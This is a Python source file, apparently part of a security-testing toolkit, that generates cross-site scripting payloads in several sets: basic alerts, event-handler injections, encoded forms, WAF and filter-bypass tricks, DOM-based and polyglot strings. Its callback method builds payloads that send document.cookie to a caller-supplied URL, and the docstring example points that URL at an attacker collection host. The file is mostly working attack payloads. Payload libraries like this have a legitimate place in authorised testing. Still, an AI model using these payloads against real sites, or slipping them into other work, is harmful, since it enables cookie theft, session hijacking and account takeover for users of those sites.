"""
AIPT XSS Payloads

Cross-Site Scripting payloads for security testing.
"""
from __future__ import annotations

import html
import random
import string
from typing import Iterator
from urllib.parse import quote


class XSSPayloads:
    """
    XSS payload generator for security testing.

    Categories:
    - Basic: Simple alert/confirm payloads
    - Event handlers: onclick, onerror, etc.
    - Encoded: URL, HTML, Unicode encoding
    - Filter bypass: WAF evasion techniques
    - DOM-based: document.write, innerHTML

    Example:
        xss = XSSPayloads()

        # Get all basic payloads
        for payload in xss.basic():
            test(payload)

        # Get payloads with custom marker
        for payload in xss.with_callback("https://attacker.com/collect"):
            test(payload)
    """

    # Unique marker for detection
    _marker = "AIPT" + "".join(random.choices(string.ascii_lowercase, k=6))

    @classmethod
    def basic(cls) -> Iterator[str]:
        """Basic XSS payloads"""
        payloads = [
            f'<script>alert("{cls._marker}")</script>',
            f'<script>alert(String.fromCharCode(65,73,80,84))</script>',
            f'<img src=x onerror=alert("{cls._marker}")>',
            f'<svg onload=alert("{cls._marker}")>',
            f'<body onload=alert("{cls._marker}")>',
            f'<input onfocus=alert("{cls._marker}") autofocus>',
            f'<marquee onstart=alert("{cls._marker}")>',
            f'<video><source onerror=alert("{cls._marker}")>',
            f'<audio src=x onerror=alert("{cls._marker}")>',
            f'<details open ontoggle=alert("{cls._marker}")>',
        ]
        yield from payloads

    @classmethod
    def event_handlers(cls) -> Iterator[str]:
        """Event handler-based payloads"""
        handlers = [
            "onclick", "ondblclick", "onmousedown", "onmouseup", "onmouseover",
            "onmousemove", "onmouseout", "onkeydown", "onkeypress", "onkeyup",
            "onfocus", "onblur", "onchange", "onsubmit", "onreset", "onselect",
            "onerror", "onload", "onunload", "onresize", "onscroll",
        ]

        for handler in handlers:
            yield f'<div {handler}=alert("{cls._marker}") style="width:100px;height:100px;background:red"></div>'
            yield f'<input type="text" {handler}=alert("{cls._marker}")>'

    @classmethod
    def encoded(cls) -> Iterator[str]:
        """Encoded payloads to bypass filters"""
        base = f'<script>alert("{cls._marker}")</script>'

        # URL encoding
        yield quote(base)
        yield quote(base, safe="")

        # HTML entity encoding
        yield html.escape(base)
        yield "".join(f"&#{ord(c)};" for c in base)
        yield "".join(f"&#x{ord(c):x};" for c in base)

        # Unicode encoding
        yield base.encode("unicode_escape").decode()

        # Mixed encoding
        yield f'%3Cscript%3Ealert("{cls._marker}")%3C/script%3E'
        yield f'&#60;script&#62;alert("{cls._marker}")&#60;/script&#62;'

    @classmethod
    def filter_bypass(cls) -> Iterator[str]:
        """Filter/WAF bypass payloads"""
        payloads = [
            # Case variations
            f'<ScRiPt>alert("{cls._marker}")</ScRiPt>',
            f'<SCRIPT>alert("{cls._marker}")</SCRIPT>',

            # Null bytes
            f'<scr\x00ipt>alert("{cls._marker}")</script>',

            # Space variations
            f'<script\t>alert("{cls._marker}")</script>',
            f'<script\n>alert("{cls._marker}")</script>',
            f'<script\r>alert("{cls._marker}")</script>',

            # Tag manipulation
            f'<scr<script>ipt>alert("{cls._marker}")</scr</script>ipt>',
            f'<<script>script>alert("{cls._marker}")<</script>/script>',

            # Using different tags
            f'<svg/onload=alert("{cls._marker}")>',
            f'<svg\tonload=alert("{cls._marker}")>',
            f'<img src=`x`onerror=alert("{cls._marker}")>',
            f'<img src="x" onerror="alert(\'{cls._marker}\')">',

            # JavaScript protocol
            f'javascript:alert("{cls._marker}")',
            f'java\nscript:alert("{cls._marker}")',
            f'java\tscript:alert("{cls._marker}")',

            # Data URI
            f'data:text/html,<script>alert("{cls._marker}")</script>',
            f'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',

            # Expression (IE)
            f'<div style="x:expression(alert(\'{cls._marker}\'))">',

            # SVG
            f'<svg><script>alert("{cls._marker}")</script></svg>',
            f'<svg><animate onbegin=alert("{cls._marker}")>',

            # Without quotes
            f'<img src=x onerror=alert({cls._marker})>',

            # Without parentheses
            f'<img src=x onerror=alert`{cls._marker}`>',
            f'<script>alert`{cls._marker}`</script>',

            # Using eval
            f'<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>',
        ]
        yield from payloads

    @classmethod
    def dom_based(cls) -> Iterator[str]:
        """DOM-based XSS payloads"""
        payloads = [
            # document.write
            f'<script>document.write("<img src=x onerror=alert(\'{cls._marker}\')>")</script>',

            # innerHTML
            f'<div id="test"></div><script>document.getElementById("test").innerHTML="<img src=x onerror=alert(\'{cls._marker}\')>"</script>',

            # location manipulation
            f'#<script>alert("{cls._marker}")</script>',
            f'javascript:alert("{cls._marker}")//',

            # eval-based
            f'<script>eval("ale"+"rt(\'{cls._marker}\')")</script>',
            f'<script>setTimeout("alert(\'{cls._marker}\')",0)</script>',
            f'<script>setInterval("alert(\'{cls._marker}\')",1000)</script>',
        ]
        yield from payloads

    @classmethod
    def with_callback(cls, callback_url: str) -> Iterator[str]:
        """Payloads that call back to attacker server"""
        payloads = [
            f'<script>new Image().src="{callback_url}?c="+document.cookie</script>',
            f'<img src="{callback_url}?c="+document.cookie>',
            f'<script>fetch("{callback_url}?c="+document.cookie)</script>',
            f'<script>navigator.sendBeacon("{callback_url}",document.cookie)</script>',
        ]
        yield from payloads

    @classmethod
    def polyglot(cls) -> Iterator[str]:
        """Polyglot payloads that work in multiple contexts"""
        payloads = [
            f'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert("{cls._marker}")//\'>',
            f'--></script><script>alert("{cls._marker}")</script>',
            f'"-alert("{cls._marker}")-"',
            f'\'-alert("{cls._marker}")-\'',
            f'</script><script>alert("{cls._marker}")</script>',
        ]
        yield from payloads

    @classmethod
    def all(cls) -> Iterator[str]:
        """All XSS payloads"""
        yield from cls.basic()
        yield from cls.event_handlers()
        yield from cls.encoded()
        yield from cls.filter_bypass()
        yield from cls.dom_based()
        yield from cls.polyglot()

    @classmethod
    def get_marker(cls) -> str:
        """Get current unique marker"""
        return cls._marker
